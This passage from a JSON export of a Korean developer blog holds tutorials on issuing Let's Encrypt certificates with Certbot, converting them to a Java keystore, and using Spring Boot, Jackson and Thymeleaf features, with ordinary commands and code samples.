cert_and_key.p12 -srcstoretype PKCS12 -srcstorepass [PKCS12에서 사용한 암호] -alias [openssl에서 -name 속성에 입력한 이름]\n\n> Importing keystore cert_and_key.p12 to letsencrypt.jks...\n```\n\n이렇게 하면 현 디렉토리에 지정한 **jks**파일이 생성되게 됩니다.\n\n<br>\n\n### Import 해주기\n\n그리고 마지막으로 생성된 파일을 임포트 해줍니다.\n\n```\n> keytool -import -trustcacerts -alias root -file chain.pem -keystore letsencrypt.jks\n> Enter keystore password: [openssl pkcs12 입력한 암호]\n> Certificate was added to keystore\n```\n\n이렇게 하면 pem 인증서를 jks 파일로 변환하고, 해당 변환된 파일을 keytool에 import까지 해주었습니다.  \n이후에는 [Spring Boot에서 HTTPS 적용하기](http://elfinlas.github.io/spring_spring-boot/171129_springboot-https/) 포스팅에 절차에 따라 등록하시면 됩니다.\n\n약간 변동사항이 있다면...\n\n```\n\tkey-store:\n\tkey-store-password:\n\tkey-password:\n```\n\n위 세가지 옵션만 사용하며, key-alias, trust-store, trust-store-password은 저 같은 경우 사용하지 않았습니다.\n\n<br>\n\n## 결론\n\n포스팅을 위해 자료를 어느정도 모아두었지만, 정리하는 것은 힘드네요.  \n이 글을 보시고 도움이 되셨으면 합니다.\n\n감사합니다.\n\n```toc\n\n```\n"},{"excerpt":"22.09.25 내용 추가 최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다. Webroot도 사용하지만 와일드카드(ex: *.api.com 등) 인증이 불가하기 때문에 DNS 인증을 사용할 것을 추천한다. DNS 인증 방식이 필요한 경우 아래 포스팅을 참고하자. LetsEncrypt 적용법 (DN…","fields":{"slug":"/letsencrypt/180319_certbot-ssl/"},"frontmatter":{"date":"March 19, 2018","title":"Certbot으로 무료 인증서 발급","description":null,"tags":["LetsEncrypt","Infra"],"series":"LetsEncrypt","previewImage":"letsencrypt_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.jpg)\n\n# 22.09.25 내용 추가\n\n최근 방식의 경우 Webroot나 DNS 인증을 사용하는데, 이번에 DNS 인증에 대하여 포스팅을 진행했다.  \nWebroot도 사용하지만 와일드카드(ex: \\*.api.com 등) 인증이 불가하기 때문에 DNS 인증을 사용할 것을 추천한다.  \nDNS 인증 방식이 필요한 경우 아래 포스팅을 참고하자.\n\n[LetsEncrypt 적용법 (DNS 인증 & AWS)](https://elfinlas.github.io/letsencrypt/220923_use-letsencrypt)\n\n<br>\n\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-03-19) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# 무료 인증서를 받기 위해서...\n\n사내정보시스템을 1차 오픈을 위해서 aws 준비, 도메인 설정 등등 이것저것 할일이 많았습니다.\n\n그 중 HTTPS 적용을 위해서 인증서를 알아보고 있었습니다.\n\n개발중에는 인증서를 직접 만들어 사용하였지만, 정식오픈을 할 경우 공식적인 인증을 받은 인증서를 사용해야 했습니다.\n\n그래서 이것저것 찾아보던 중 Certbot을 알게 되었습니다.\n\n오늘의 포스팅 목표는 다음과 같습니다.\n\n> Aws EC2의 우분투(16.04) 환경에서 Spring Boot를 jar로 구동하고, Let's Encrypt에서 발급받은 인증서로 Https를 적용하기\n\n처음 해보는 것이라서 시행착오와 조사할 내용이 많았는데 이것을 정리하며 포스팅을 진행하도록 하겠습니다.\n\n<br>\n\n## Let's Encrypt? Certbot?\n\n처음에 햇갈린 것이 저 두개가 무엇인지에 대한 것이었습니다.\n\n**Let's Encrypt**의 경우 Https의 확산을 늘리기 위한 취지로 시작된 비영리 프로젝트입니다.  \n[Let's Encrypt 공식 홈페이지](https://letsencrypt.org)에서 좀 더 자세한 정보를 확인할 수 있습니다.\n\n**Certbot**은 Let's Encrypt 인증서를 자동으로 발급 및 갱신을 해주는 봇 프로그램입니다.  \n[certbot 공식 홈페이지](https://certbot.eff.org)에서 운영할 소프트웨어(Apache, Nginx, etc)와 OS에 따른 설치 방법을 제공합니다.\n\n필요하신 분은 공식 홈페이지에서 알맞는 설치 방법을 확인하시기 바랍니다.\n\n시작 전에...\nLet's Encrypt 인증서 발급 프로세스는 아래와 같습니다.\n\n1. 인증서 요청\n2. 도메인에 대한 소유권 확인\n3. 발급\n\n위의 세 가지를 거치는데 이것을 자동으로 수행해주는 프로그램이라 생각하면 됩니다.  \n이번 포스팅에서는 **Certbot**을 이용해서 인증서를 발급받아 보도록 하겠습니다.\n\n- **Certbot**을 이용해 인증서를 받기 전 준비물은 **서비스할 도메인 주소**, **서비스를 운용하는 서버** 가 필수적으로 필요합니다.\n\n<br>\n\n## Certbot 설치\n\n먼저 우분투(16.04)에서 Certbot을 설치해야 합니다.\n\n```\n> sudo apt-get update #apt-get 업데이트\n> sudo apt-get install software-properties-common  #선행 소프트웨어 설치\n> sudo add-apt-repository ppa:certbot/certbot #저장소 추가\n> sudo apt-get update  #apt-get 업데이트\n```\n\n여기까지 하면 apt-get에서 certbot을 설치할 수 있는데 **(아직 certbot 설치 전)** 설치를 하기 전에 고려할 것이 있습니다.\n\n**Certbot**을 통해서 인증서를 발급받을 위 프로세스에서 2번 항목인 소유권 확인이 있습니다.  \n왜 도메인 소유권을 확인하는지 궁금하실 수 있습니다.\n\n이는 클라이언트에서는 상대방 서버가 진짜 통신하려는 사용자 서버인지를 검증하기 위함입니다.\n\n예를 들어 소유하지 않은 도메인에 대한 인증서를 신뢰성이 있는 발급기관으로부터 발급받았다 한다면 해당 도메인을 이용하여 가짜 서버로 연결되게 할 수 있습니다.\n\n만약 도메인 검증을 안한다면, 악의를 가진 사람이 국내에서 유명한 naver.com이나 daum.net 등의 도메인으로 인증서를 발급받게 되고, 해당 도메인에 약간의 조작을 통해서 자신이 만든 해킹을 목적으로 하는 서버에 연결하게끔 할 수 있게 됩니다.\n\n좀 더 자세한 사항은 **StartSSL 사건**을 검색해보시면 이해가 더욱 쉽습니다.\n\n다시...  \n이 소유권 확인을 위해 Certbot에서는 두 가지 인증 방법을 제공합니다.\n\n<br>\n\n1. **Standalone 방식**\n\n   이 방법은 Certbot이 간이 웹 서버를 돌려 도메인 인증 요청을 처리하는 방식입니다.\n   하지만 인증용 간이 서버가 80, 443번 포트를 사용하기 때문에 운영 중인 서버가 해당 포트를 쓰게 된다면, 발급 또는 갱신 시 마다 **잠시 서버를 내려야 하는 문제**가 있습니다.\n   물론 해당 포트를 사용하지 않는다면 이 방법을 사용하셔도 무방합니다.\n\n2) **Webroot 방식**\n\n   이 방법은 도메인 인증을 위해 외부에서 접근 가능한 경로를 제공하고, Let's Encrypt 측에서 해당 경로로 접속해 인증을 하는 방식입니다.\n   이 방식을 사용할 경우 1번 방식의 **서비스 종료**는 하지 않아도 됩니다.\n\n<br>\n\n이번 포스팅에서는 **2번 Webroot** 방식을 사용하여 진행을 할 것입니다.\n\n저의 경우 Java -jar로 수행을 하고, 향후 앞단에 서버를 하나 둘 예정이어서 **Apache**를 하나 설치하여 진행하였습니다.\n\n이제 설치부분으로 넘어와서...\n\n```\n> sudo apt-get install certbot\n```\n\n<br>\n\n## Certbot으로 인증서 발급받기\n\n설치를 완료한 뒤에는 위에서 언급한 도메인 인증 방법을 선택하여 발급받아야 합니다.\n\n1번 방식을 사용할 경우...\n\n```\n> sudo certbot certonly --standalone -d [도메인명]\n```\n\n2번 방법을 사용할 경우\n\n```\n> sudo certbot certonly --webroot -w [접근 가능 경로] -d [도메인명]\n```\n\n몇 가지 옵션을 설명하자면...\n\n- -w : webroot 인증 방식 시 인증 파일을 생성할 기준 폴더를 명시합니다.\n  예시로 Apache의 경우 /var/www/html 와 같은 경로를 의미합니다.\n- -d : 인증서를 적용할 도메인 명을 적어줍니다.\n  만약 2개 이상을 작성할 경우 -d [도메인 명] -d [도메인 명] 으로 복수 작성 가능합니다.\n- certonly : 인증서 생성 및 갱신만 진행하는 옵션\n- --work-dir : 작업 디렉토리 지정 옵션 (기본값: /var/lib/letsencrypt)\n- --logs-dir : 로그 디렉토리 지정 옵션 (기본값: /var/log/letsencrypt)\n- --config-dir : 설정파일 및 인증서가 저장되는 디렉토리 지정하는 옵션 (기본값: /etc/letsencrypt)\n\n<br>\n\n아래는 실제 사용된 명령어 및 결과입니다.  \n주요 정보 및 민감정보는 임의 수정을 하였고, 실행하는 OS 및 구성에 따라 아래와는 다르게 결과가 출력될 수 있습니다.\n\n```\nubuntu@ip-000-00-00-000:/var/www/html$ sudo certbot certonly --webroot -w /var/www/html -d [mydomain]\nSaving debug log to /var/log/letsencrypt/letsencrypt.log\nPlugins selected: Authenticator webroot, Installer None\nEnter email address (used for urgent renewal and security notices) (Enter 'c' to\ncancel): [등록 시 사용할 이메일 주소 입력]\nStarting new HTTPS connection (1): acme-v01.api.letsencrypt.org\n\n-------------------------------------------------------------------------------\nPlease read the Terms of Service at\nhttps://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You must\nagree in order to register with the ACME server at\nhttps://acme-v01.api.letsencrypt.org/directory\n-------------------------------------------------------------------------------\n(A)gree/(C)ancel: A\n\n-------------------------------------------------------------------------------\nWould you be willing to share your email address with the Electronic Frontier\nFoundation, a founding partner of the Let's Encrypt project and the non-profit\norganization that develops Certbot? We'd like to send you email about EFF and\nour work to encrypt the web, protect its users and defend digital rights.\n-------------------------------------------------------------------------------\n(Y)es/(N)o: Y\n\nStarting new HTTPS connection (1): supporters.eff.org\nObtaining a new certificate\nPerforming the following challenges:\nhttp-01 challenge for member.tachyontech.co.kr\nUsing the webroot path /var/www/html for all unmatched domains.\nWaiting for verification...\nCleaning up challenges\n\nIMPORTANT NOTES:\n - Congratulations! Your certificate and chain have been saved at:\n   /etc/letsencrypt/live/member.tachyontech.co.kr/fullchain.pem\n   Your key file has been saved at:\n   /etc/letsencrypt/live/member.tachyontech.co.kr/privkey.pem\n   Your cert will expire on 2018-06-16. To obtain a new or tweaked\n   version of this certificate in the future, simply run certbot\n   again. To non-interactively renew *all* of your certificates, run\n   \"certbot renew\"\n - Your account credentials have been saved in your Certbot\n   configuration directory at /etc/letsencrypt. You should make a\n   secure backup of this folder now. This configuration directory will\n   also contain certificates and private keys obtained by Certbot so\n   making regular backups of this folder is ideal.\n - If you like Certbot, please consider supporting our work by:\n\n   Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n   Donating to EFF:                    https://eff.org/donate-le\n\nubuntu@ip-000-00-00-000:/var/www/html$\n```\n\n위에서 결과 중 **IMPORTANT NOTES:** 아래에 **Congratulations!** 라는 멘트가 있으면 인증서 발급에 성공한 것입니다.  \n발급받은 인증서를 확인하려면 아래의 명령어를 통해 확인 가능합니다.\n\n```\nubuntu@ip-000-00-00-000:/var/www/html$ sudo certbot certificates\nSaving debug log to /var/log/letsencrypt/letsencrypt.log\n\n-------------------------------------------------------------------------------\nFound the following certs:\n  Certificate Name: [name]\n    Domains: [name]\n    Expiry Date: 2018-06-16 11:50:35+00:00 (VALID: 89 days)\n    Certificate Path: /etc/letsencrypt/live/[name]/fullchain.pem\n    Private Key Path: /etc/letsencrypt/live/[name]/privkey.pem\n-------------------------------------------------------------------------------\nubuntu@ip-000-00-00-000:/var/www/html$\n```\n\n이로써 인증서 발급에 대한 설명은 끝났습니다.\n간략하게 정리를 하면 아래와 같습니다.\n\n1. 도메인 및 서버 준비\n2. certbot 설치\n3. certbot으로 인증서 발급\n\n다음 포스팅에서는 생성된 pem 인증서를 Spring boot에 붙여서 사용하는 방법을 알아보겠습니다.\n\n[Certbot으로 만든 인증서를 Spring Boot에서 사용하기](https://elfinlas.github.io/spring_spring-boot/180319_spring-boot-tls-certbot/)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-02-28) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Java8의 LocalDateTime을 Json으로 변환하였더니... 제가 개발하는 프로젝트들은 Java8을 이용하여 개발을 하고 있습니다. 그 중 Java8의 Date 클래스를 보완하기 위해 나온 것이 J…","fields":{"slug":"/java/180228_java8Localdate2Json/"},"frontmatter":{"date":"February 28, 2018","title":"Java8의 LocalDateTime을 Json으로 전송 시 ISO-8601 형식으로 출력하기","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-02-28) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Java8의 LocalDateTime을 Json으로 변환하였더니...\n\n제가 개발하는 프로젝트들은 Java8을 이용하여 개발을 하고 있습니다.  \n그 중 Java8의 Date 클래스를 보완하기 위해 나온 것이 Java8의 **LocalDateTime**입니다.  \n그런데 이 **LocalDateTime**을 Spring-Boot에서 Json 형식으로 호출할 경우 아래와 같이 Json을 만들게 됩니다.\n\n<br>\n\n![](/img_01.png)\n\n<br>\n\n위 사진에서 **joinDate**라는 값을 보면 날짜 정보가 상세하게 등록되어 있는 것을 확인할 수 있습니다.  \n하지만 요즘은 [ISO-8601(한국위키)](https://ko.wikipedia.org/wiki/ISO_8601)의 양식에 맞춰서 사용합니다.\n\n<br>\n\n![](/img_02.png)\n\n<br>\n\n위 사진처럼 결과를 나오게 하는 방법을 알아보겠습니다.  \n예제 환경은 아래와 같습니다.\n\n> Spring Boot 1.5.8.RELEASE\n> Gradle 환경\n\n## 1. build.gradle에 의존성 추가\n\n아래의 의존성을 작성합니다.\n\n> compile \"com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.9.4\"\n\n해당 라이브러리는 **LocalDateTime** 및 **LocalDate** 등의 날짜, 시간 관련 객체를 인식할 수 있도록 해주는 Jackson 라이브러리 입니다.\n\n이것만 추가한 후 gradle을 동기화 해주면 끝입니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-02-18) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Thymeleaf에서 반복문 그리고 index 사용하기 thymeleaf에서 table 태그와 같이 안의 셀 내용을 반복적으로 표시해야 하는 경우(대표적으로 게시판이 있죠?)에 for와 같은 loop를 사…","fields":{"slug":"/thymeleaf/180218_thymeleaf-loop-index/"},"frontmatter":{"date":"February 18, 2018","title":"Thymeleaf에서 반복문 사용 및 index 값 사용하기","description":null,"tags":["Thymeleaf"],"series":"Thymeleaf","previewImage":"thymeleaf_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-02-18) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_thymeleaf.png)\n\n<br>\n\n# Thymeleaf에서 반복문 그리고 index 사용하기\n\nthymeleaf에서 table 태그와 같이 안의 셀 내용을 반복적으로 표시해야 하는 경우(대표적으로 게시판이 있죠?)에 for와 같은 loop를 사용하게 됩니다.\n\n```html\n<tbody>\n  <tr th:each=\"dto : ${report.getLightFileDtoList()}\">\n    <td th:text=\"${dto.getByteSize()}\"></td>\n  </tr>\n</tbody>\n```\n\n위의 예제와 같이 사용을 합니다.  \n그런데 이렇게 loop식으로 사용하는 것 외에도 특정 반복 인덱스에서 무언가 작업 처리를 해야 할 때가 있습니다.  \n그런 경우 다음의 예제와 같이 사용합니다.\n\n```html\n<tr th:each=\"fInClient,index : ${factory.getFactoryClientList()}\">\n  <td>\n    <input\n      type=\"text\"\n      class=\"form-control\"\n      id=\"client_name_0\"\n      th:value=\"${fInClient.getName()}\"\n    />\n  </td>\n  <td>\n    <th:block th:if=\"${index.index} > 0\">\n      <button type=\"button\" class=\"btn btn-danger\">\n        <i class=\"fa fa-minus\"></i>\n      </button>\n    </th:block>\n  </td>\n</tr>\n\n<tr></tr>\n```\n\n첫 번째 인자는 **each**항목에서 반복문에서 나온 값이며, 두 번째 인자는 loop 인덱스의 값으로써 접근은 <b>\\${index.index}</b> 할 수 있습니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-02-18) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Spring에서 Controller의 전달인자... Spring을 사용하다 보면 Controller 단에서 클라이언트에서 URL에 파라메터를 같이 전달하는 경우가 있습니다. 주로 사용하는 형태는 아래의 두…","fields":{"slug":"/spring_spring-boot/180218_spring-parameter/"},"frontmatter":{"date":"February 18, 2018","title":"Spring에서 @RequestParam과 @PathVariable","description":null,"tags":["Spring"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-02-18) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_spring.png)\n\n<br>\n\n# Spring에서 Controller의 전달인자...\n\nSpring을 사용하다 보면 Controller 단에서 클라이언트에서 URL에 파라메터를 같이 전달하는 경우가 있습니다.  \n주로 사용하는 형태는 아래의 두 가지가 대표적인 케이스입니다.\n\n> Type 1 => http://127.0.0.1?index=1&page=2  \n> Type 2 => http://127.0.0.1/index/1\n\n**Type 1**의 경우 파라메터의 값과 이름을 함께 전달하는 방식으로 게시판 등에서 페이지 및 검색 정보를 함께 전달하는 방식을 사용할 때 많이 사용합니다.  \n**Type 2**의 경우 Rest api에서 값을 호출할 때 주로 많이 사용합니다.\n\nSpring에서는 이러한 전달인자를 처리하는데 두 가지 방법을 제공합니다.\n\n<br>\n\n## @RequestParam 사용하기\n\n**Type 1**의 URL을 처리할 때 **@RequestParam**을 사용하게 됩니다.  \n아래의 예제와 같이 Controller 단에서 사용합니다.\n\n```java\n@GetMapping(\"read\")\npublic ModelAndView getFactoryRead(@RequestParam(\"no\") int factroyId, SearchCriteria criteria)\n{\n  //...\n}\n```\n\n위의 경우 <b>/read?no=1</b>와 같이 url이 전달될 때 no 파라메터를 받아오게 됩니다.  \n@RequestParam 어노테이션의 괄호 안의 경우 전달인자 이름(실제 값을 표시)입니다.  \n이렇게 **@RequestParam**의 경우 url 뒤에 붙는 파라메터의 값을 가져올 때 사용을 합니다.\n\n<br>\n\n## @PathVariable 사용하기\n\n**Type 2**의 URL을 처리할 때는 **@PathVariable**을 사용하게 됩니다.\n\n```java\n@PostMapping(\"delete/{idx}\")\n@ResponseBody\npublic JsonResultVo postDeleteFactory(@PathVariable(\"idx\") int factoryIdx) {\n\treturn factoryService.deleteFacotryData(factoryIdx);\n}\n```\n\n위에 예제 코드처럼 **PathVariable**의 경우 url에서 각 구분자에 들어오는 값을 처리해야 할 때 사용합니다.\n\n<br>\n\n## 실제로 사용은?\n\n물론 **@RequestParam** 또는 **@PathVariable** 하나만 사용하는 것이 아닌 복합적으로 사용을 하기도 합니다.\n\n```java\n@GetMapping(\"/user/{userIdx}/invoices\")\npublic List<Invoice> listUsersInvoices(\n\t@PathVariable(\"userIdx\") int user,\n\t@RequestParam(value = \"date\", required = false) Date dateOrNull\n)\n```\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-02-18) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Thymeleaf에서 조건문 사용하기 Thymeleaf를 사용하다 보면 서버측의 데이터에 대한 분기 조건이 필요할 경우가 있습니다. 이번 포스팅에서는 if와 else를 사용하는 것에 대해 알아보겠습니다. …","fields":{"slug":"/thymeleaf/180218_thymeleaf-if-exam/"},"frontmatter":{"date":"February 18, 2018","title":"Thymeleaf에서 if else 조건문 사용법","description":null,"tags":["Thymeleaf"],"series":"Thymeleaf","previewImage":"thymeleaf_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-02-18) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_thymeleaf.png)\n\n<br>\n\n# Thymeleaf에서 조건문 사용하기\n\nThymeleaf를 사용하다 보면 서버측의 데이터에 대한 분기 조건이 필요할 경우가 있습니다.  \n이번 포스팅에서는 if와 else를 사용하는 것에 대해 알아보겠습니다.\n\n<br>\n\n## if 문\n\nThymeleaf에서 if문은 다음과 같이 사용합니다.\n\n```html\n<li th:if=\"${pageMaker.isPrev()}\"></li>\n```\n\n**th:if** 문법으로 사용하는데 태그는 li 뿐만이 아닌 div등에 사용하여 조건이 맞는 경우 화면에 보여줄 수도 있고, 감출 수도 있습니다.  \n만약 다중 조건을 찾아야 하는 경우에는 다음과 같이 사용하기도 합니다.\n\n```html\n<span th:if=\"${account.getAccountStatus().toString().equals('ACTIVE')}\">재직중</span>\n<span th:if=\"${account.getAccountStatus().toString().equals('VACATION')}\">휴가</span>\n<span th:if=\"${account.getAccountStatus().toString().equals('ETC')}\">기타</span>\n```\n\n<br>\n\n## else 문\n\n다중 if문으로도 체크 가능하지만 그 외의 값을 체크할 때 else를 사용하는데, else는 thymeleaf에서는 다른 속성인 **th:unless**를 사용합니다.\n사용 예제 코드는 다음과 같습니다.\n\n```html\n<td\n  th:if=\"${dto.getFileStatus().toString()} == 'ON_SUMMER'\"\n  th:text=\"${dto.getUploadName()} + ' (에디터 첨부파일)'\"\n></td>\n<td th:unless=\"${dto.getFileStatus().toString()} == 'ON_SUMMER'\" th:text=\"${dto.getUploadName()}\"></td>\n```\n\n위의 예제처럼 **th:unless**는 if문과 조건이 동일하지만 사실 if조건과 다른 조건인 경우를 검색하게 됩니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-02-17) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Thymeleaf에서 페이지 레이아웃을 도와주는... Spring boot로 개발을 하면 화면단 작업을 할 때 템플릿 엔진을 사용하게 됩니다. Freemaker, JSP, Thymeleaf와 같은 텍스트 …","fields":{"slug":"/thymeleaf/180217_thymeleaf-layout-dialect/"},"frontmatter":{"date":"February 17, 2018","title":"Thymeleaf에서 thymeleaf-layout-dialect 소개","description":null,"tags":["Thymeleaf"],"series":"Thymeleaf","previewImage":"thymeleaf_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-02-17) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_thymeleaf.png)\n\n<br>\n\n# Thymeleaf에서 페이지 레이아웃을 도와주는...\n\nSpring boot로 개발을 하면 화면단 작업을 할 때 템플릿 엔진을 사용하게 됩니다.  \n**Freemaker**, **JSP**, **Thymeleaf**와 같은 **텍스트 템플릿 엔진**을 사용하거나 **Tiles**나 **Sitemesh**와 같은 **레이아웃 템플릿 엔진**을 함께 사용하여 화면단 개발을 하게 됩니다.\n\n이중 Thymeleaf에서는 공통적으로 사용하는 레이아웃을 작성하기 위해서는 **thymeleaf-layout-dialect**를 사용하면 좋습니다.\n\n[Thymeleaf Layout Dialect Github](https://github.com/ultraq/thymeleaf-layout-dialect) 페이지의 소개글을 간략하게 번역하자면 다음과 같습니다. (오류 번역이 있을 수 있습니다.)\n\n> 타임리프에서 코드 재사용을 개선하기 위해 재사용이 가능한 레이아웃과 템플릿을 작성할 수 있도록 도와주는 라이브러리입니다.\n\n이 라이브러리는 **Spring Boot 1.5.8.RELEASE**의 **spring-boot-starter-thymeleaf** 스타터 의존성에 포함되어 있습니다.\n\n만약 Spring Boot starter를 사용하지 않거나, 다른 환경에서 사용하실 경우 [공식 문서](https://ultraq.github.io/thymeleaf-layout-dialect/Installation.html)의 설치 부분을 참고하시기 바랍니다.\n\n<br>\n\n## thymeleaf-layout-dialect의 간단한 사용 예제\n\n공식 Github에 있는 예제를 기준으로 설명드리려 합니다.\n\n<br>\n\n### 1. 공통으로 사용할 Layout html 작성하기\n\n먼저 컨텐츠 페이지에서 공통적으로 사용할 html을 작성합니다.  \n이 공통적으로 사용될 layout 파일명을 **comm_layout.html**이라 하겠습니다.\n\n```html\n<!DOCTYPE html>\n<html xmlns:layout=\"http://www.ultraq.net.nz/thymeleaf/layout\">\n  <head>\n    <title>Layout page</title>\n    <script src=\"common-script.js\"></script>\n  </head>\n  <body>\n    <header>\n      <h1>My website</h1>\n    </header>\n    <section layout:fragment=\"content\">\n      <p>Page content goes here</p>\n    </section>\n    <footer>\n      <p>My footer</p>\n      <p layout:fragment=\"custom-footer\">Custom footer here</p>\n    </footer>\n  </body>\n</html>\n```\n\n<br>\n\n### 2. 실제 컨텐츠 페이지\n\n컨텐츠 페이지는 다음과 같습니다.\n\n```html\n<html\n  xmlns:layout=\"http://www.ultraq.net.nz/thymeleaf/layout\"\n  layout:decorator=\"comm_layout\"\n>\n  <head>\n    <title>Content page</title>\n    <script src=\"content-script.js\"></script>\n  </head>\n  <body>\n    <section layout:fragment=\"content\">\n      <p>This is a paragraph from the content page</p>\n    </section>\n    <footer>\n      <p layout:fragment=\"custom-footer\">\n        This is some footer content from the content page\n      </p>\n    </footer>\n  </body>\n</html>\n```\n\n컨텐츠 페이지에서 html의 태그 안에서 **layout:decorator** 속성이 있습니다.  \n해당 속성은 공통 레이아웃을 지정하는 속성으로 위 1번에서 사용한 레이아웃 파일명을 작성해줍니다.  \n확장자는 제거한 파일명을 적어주며, 실제 Spring Boot에서 사용하는 경로에 맞춰서 작성하게 됩니다.\n\n위 공통 레이아웃과 실제 컨텐츠를 적용한 페이지는 다음과 같은 **결과물**로 만들어지게 됩니다.\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Content page</title>\n    <script src=\"common-script.js\"></script>\n    <script src=\"content-script.js\"></script>\n  </head>\n  <body>\n    <header>\n      <h1>My website</h1>\n    </header>\n    <section>\n      <p>This is a paragraph from the content page</p>\n    </section>\n    <footer>\n      <p>My footer</p>\n      <p>This is some footer content from the content page</p>\n    </footer>\n  </body>\n</html>\n```\n\n위의 결과물을 보면 동작 원리나 방식에 대한 이해가 더 잘 될것입니다.  \n공통 레이아웃에 실제 컨텐츠 페이지를 덮어둔 형식으로 결과가 나오게 됩니다.  \n하지만 공통 레이아웃의 **layout:fragment=** 부분은 실제 컨텐츠 페이지의 선언된 내용으로 치환하게 됩니다.\n\n**thymeleaf-layout-dialect**의 layout namespace를 사용하여 기본적인 방법을 알아봤습니다.\n\nThymeleaf에서 실제로 **dialect**를 사용하는 예제는 [Thymeleaf에서 템플릿 형식으로 사용하기 포스팅](https://elfinlas.github.io/thymeleaf/180216_thymeleaf-layout-dialect_exam/)을 참고해 주세요.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-02-16) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  JSP만 쓰다가... 사실 저는 Spring boot를 쓴지는 얼마 되지 않았습니다. 그 전에는 Spring + Jsp + mybatis 조합을 많이 사용하였지요. Spring Boot를 접하게 된 것은 …","fields":{"slug":"/thymeleaf/180216_thymeleaf-layout-dialect_exam/"},"frontmatter":{"date":"February 16, 2018","title":"Thymeleaf에서 템플릿 형식으로 사용하기(With thymeleaf-layout-dialect)","description":null,"tags":["Thymeleaf"],"series":"Thymeleaf","previewImage":"thymeleaf_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-02-16) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_thymeleaf.png)\n\n<br>\n\n# JSP만 쓰다가...\n\n사실 저는 Spring boot를 쓴지는 얼마 되지 않았습니다.  \n그 전에는 Spring + Jsp + mybatis 조합을 많이 사용하였지요.\n\nSpring Boot를 접하게 된 것은 4월달 쯔음 토이 프로젝트를 하나 진행하면서 쓰게 되었습니다.  \nSpring을 쓰다가 Spring Boot를 사용하였을 때는 신세계 였습니다.  \nSpring Boot에서는 View단을 JSP보다는 **Thymeleaf**라는 것을 사용하길 권장하고 있습니다.\n\n**Thymeleaf**는 순수 HTML에 HTML5문법을 사용하여 Server side 로직을 수행할 수 있는 **HTML 태그 및 속성 기반의 Template Engine**입니다.\n\n일단 Spring Boot 에서는 JSP를 쓰려면 약간 복잡해집니다.  \n만약 Spring Boot 에서 JSP를 쓰길 원한다면 [공식문서 예제](https://github.com/spring-projects/spring-boot/tree/v1.2.3.RELEASE/spring-boot-samples/spring-boot-sample-web-jsp)를 참고하세요.  \n(러닝커브도 높은 편도 아니라 한번 써보시는 것을 추천 드립니다 :) )\n\n서론은 여기까지로 하고...  \n제가 **Thymeleaf**를 쓰면서 **공통 레이아웃에 대한 처리**를 한 부분에 대해 포스팅을 해보고자 합니다.  \n시작하기 앞서 개발환경은 다음과 같습니다.\n\n- Spring Boot = '1.5.8.RELEASE'\n- dependencies = compile('org.springframework.boot:spring-boot-starter-thymeleaf')\n\n<br>\n\n## spring-boot-starter-thymeleaf에는?\n\n먼저 예제를 살펴보기 이전에...  \n개발환경에서 의존성에 **spring-boot-starter**에 다양한 것이 있지만 그 중 thymeleaf를 사용하였습니다.  \n이 의존성은 다음과 같이 구성되어 있습니다.\n\n![](/img_01.png)\n\n이 중 맨 마지막에 추가된 [Thymeleaf Layout Dialect](https://github.com/ultraq/thymeleaf-layout-dialect)는 